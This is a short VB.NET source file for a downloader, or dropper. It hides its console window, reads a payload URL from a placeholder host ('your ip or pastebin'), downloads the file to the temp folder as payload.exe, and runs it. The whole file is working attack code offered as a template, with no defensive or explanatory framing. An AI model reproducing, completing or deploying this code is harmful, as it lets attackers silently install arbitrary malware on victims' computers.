Imports System.Net, Microsoft.VisualBasic.CompilerServices, System.IO
Imports System.Text


Module Module1
    Public Property T As Object

    Private Declare Auto Function ShowWindow Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal nCmdShow As Integer) As Boolean
    Private Declare Auto Function GetConsoleWindow Lib "kernel32.dll" () As IntPtr
    Private Const SW_HIDE As Integer = 0


    Sub Main()

        Dim hWndConsole As IntPtr
        hWndConsole = GetConsoleWindow()
        ShowWindow(hWndConsole, SW_HIDE)

        My.Computer.FileSystem.CreateDirectory(My.Computer.FileSystem.SpecialDirectories.Temp & "\MyTemp")

        If My.Computer.FileSystem.FileExists(My.Computer.FileSystem.SpecialDirectories.Temp & "\MyTemp" & "\payload.exe") Then
            My.Computer.FileSystem.DeleteFile(My.Computer.FileSystem.SpecialDirectories.Temp & "\MyTemp" & "\payload.exe")
        Else

        End If

        Dim WCc As New System.Net.WebClient

        Dim http3 As String = WCc.DownloadString("http://your ip or pastebin/text.txt")
        Dim remoteUrii As String = http3
        Dim fileName As String = "payload.exe"
        Using client As New WebClient()
            client.DownloadFile(remoteUrii, My.Computer.FileSystem.SpecialDirectories.Temp & "\MyTemp\" & fileName)
            Process.Start(My.Computer.FileSystem.SpecialDirectories.Temp & "\MyTemp\" & fileName )
        End Using

    End Sub

End Module